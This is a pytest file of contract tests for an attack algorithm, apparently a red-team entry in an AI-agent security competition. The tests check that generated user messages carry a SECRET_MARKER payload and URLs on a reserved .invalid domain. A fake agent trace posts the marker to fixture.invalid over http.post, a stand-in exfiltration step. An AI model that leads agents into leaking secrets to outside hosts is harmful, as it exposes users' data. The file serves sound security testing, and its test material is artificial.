"""Contract tests for the B014 replay-safe chainkeep candidate."""

import importlib.util
import re
import sys
import time
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B013_ATTACK_PATH = Path("baselines/replaysafe_chain4_v1/attack.py")
B012_ATTACK_PATH = Path("baselines/replaysafe_warmkeep_v1/attack.py")
B014_ATTACK_PATH = Path("baselines/replaysafe_chainkeep_v1/attack.py")
URL_RE = re.compile(r"https?://[^\s,]+")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


class NonFiringEnv(FiringEnv):
    def export_trace_dict(self):
        return {"tool_events": []}


def _collect_urls(candidate: FakeCandidate) -> list[str]:
    urls: list[str] = []
    for message in candidate.user_messages:
        urls.extend(URL_RE.findall(message))
    return urls


def test_b014_diff_against_b008_only_documented_constants() -> None:
    b008_src = B008_ATTACK_PATH.read_text(encoding="utf-8")
    b014_src = B014_ATTACK_PATH.read_text(encoding="utf-8")

    expected_constant_diffs = {
        "REPLAY_SAFE_FRAC = 0.995",
        "REPLAY_BUDGET_MULT = 1.02",
        "KEEP_WARMUP_FIRED = True",
        "_chain_candidate",
        "_chain_messages",
    }
    for expected in expected_constant_diffs:
        assert expected not in b008_src, f"B008 unexpectedly contains {expected}"
        assert expected in b014_src, f"B014 missing expected difference {expected}"


def test_b014_keeps_b008_baseline_constants() -> None:
    b008_src = B008_ATTACK_PATH.read_text(encoding="utf-8")
    b014_src = B014_ATTACK_PATH.read_text(encoding="utf-8")

    constants_must_match = (
        "SPLIT_CLASSIFY_N = 5",
        "SPLIT_THRESHOLD_S = 12.0",
        "SLOW_MULTIPOST_N = 4",
        "BURST_K = 1",
        "PROBE_HOPS = 0",
        "REPLAY_COST_COEF = 1.0",
        'PAYLOAD = "SECRET_MARKER"',
        "def _forge_plan_message",
        "def _alpha2",
        "def _label",
        "def _url",
        "def _adaptive_margin",
        "def _replay_stop",
        "def _marker_post_fired",
    )
    for constant in constants_must_match:
        assert constant in b014_src, f"B014 missing preserved constant {constant}"
        assert constant in b008_src, f"B008 unexpectedly missing {constant}"


def test_b014_urls_only_use_reserved_invalid_domain() -> None:
    module = _load_attack(B014_ATTACK_PATH, "b014_attack")
    for index in range(0, 4096, 137):
        url = module._url(index)
        assert url.endswith(".invalid"), f"non-reserved URL leaked: {url}"


def test_b014_warmup_kept_when_fired() -> None:
    module = _load_attack(B014_ATTACK_PATH, "b014_attack")
    clock = FakeClock()
    env = FiringEnv(clock, latency_s=5.0)
    algo = module.AttackAlgorithm({"hard_n_cap": 8})
    candidates = algo.run(env, FakeConfig(time_budget_s=120.0, max_tool_hops=8))
    assert candidates, "expected at least the warmup candidate"
    warmup_urls = _collect_urls(candidates[0])
    assert any(url.endswith(".invalid") for url in warmup_urls)
    assert "SECRET_MARKER" in candidates[0].user_messages[0]


def test_b014_warmup_not_kept_when_not_fired() -> None:
    module = _load_attack(B014_ATTACK_PATH, "b014_attack")
    clock = FakeClock()
    env = NonFiringEnv(clock, latency_s=5.0)
    algo = module.AttackAlgorithm({"hard_n_cap": 8})
    candidates = algo.run(env, FakeConfig(time_budget_s=120.0, max_tool_hops=8))
    if candidates:
        first_msg = candidates[0].user_messages[0]
        assert "WARMUP_IDX" not in first_msg or "899999" not in first_msg.replace(".", "").replace(
            "http://", ""
        )


def test_b014_chain_split_in_slow_rows_only() -> None:
    module = _load_attack(B014_ATTACK_PATH, "b014_attack")
    clock = FakeClock()

    real_monotonic = time.monotonic
    tick = {"value": 0.0}

    def fake_monotonic() -> float:
        tick["value"] += 14.0
        return tick["value"]

    time.monotonic = fake_monotonic
    try:
        env = FiringEnv(clock, latency_s=14.0)
        algo = module.AttackAlgorithm(
            {
                "hard_n_cap": 200,
                "replay_budget_s": 5000.0,
                "fill_budget_frac": 0.999,
            }
        )
        candidates = algo.run(env, FakeConfig(time_budget_s=600.0, max_tool_hops=8))
    finally:
        time.monotonic = real_monotonic

    chain_candidates = [c for c in candidates if len(c.user_messages) == 4]
    assert chain_candidates, "B014 expected chain4 candidates in slow-row regime"
    urls_per_chain = [_collect_urls(c) for c in chain_candidates]
    for urls in urls_per_chain:
        assert all(url.endswith(".invalid") for url in urls), urls
        assert len(urls) == 4


def test_b014_fallback_returns_at_least_minimum() -> None:
    module = _load_attack(B014_ATTACK_PATH, "b014_attack")
    clock = FakeClock()
    env = NonFiringEnv(clock, latency_s=1.0)
    algo = module.AttackAlgorithm({"hard_n_cap": 1})
    candidates = algo.run(env, FakeConfig(time_budget_s=10.0, max_tool_hops=4))
    assert candidates, "B014 should fall back to a candidate set on empty env"
    urls = []
    for c in candidates:
        for msg in c.user_messages:
            urls.extend(URL_RE.findall(msg))
    assert urls
    assert all(url.endswith(".invalid") for url in urls)


def test_b014_diff_against_b013_only_chainkeep_specific() -> None:
    b013_src = B013_ATTACK_PATH.read_text(encoding="utf-8")
    b014_src = B014_ATTACK_PATH.read_text(encoding="utf-8")
    assert "_chain_candidate" in b013_src
    assert "_chain_candidate" in b014_src
    assert "KEEP_WARMUP_FIRED = True" in b014_src
    assert "KEEP_WARMUP_FIRED" not in b013_src
    assert "REPLAY_SAFE_FRAC = 0.995" in b014_src
    assert "REPLAY_SAFE_FRAC = 0.99" in b013_src
    assert "REPLAY_BUDGET_MULT = 1.02" in b014_src
    assert "REPLAY_BUDGET_MULT = 1.0" in b013_src


def test_b014_diff_against_b012_only_chainkeep_specific() -> None:
    b012_src = B012_ATTACK_PATH.read_text(encoding="utf-8")
    b014_src = B014_ATTACK_PATH.read_text(encoding="utf-8")
    assert "KEEP_WARMUP_FIRED = True" in b012_src
    assert "KEEP_WARMUP_FIRED = True" in b014_src
    assert "_chain_candidate" in b014_src
    assert "_chain_candidate" not in b012_src
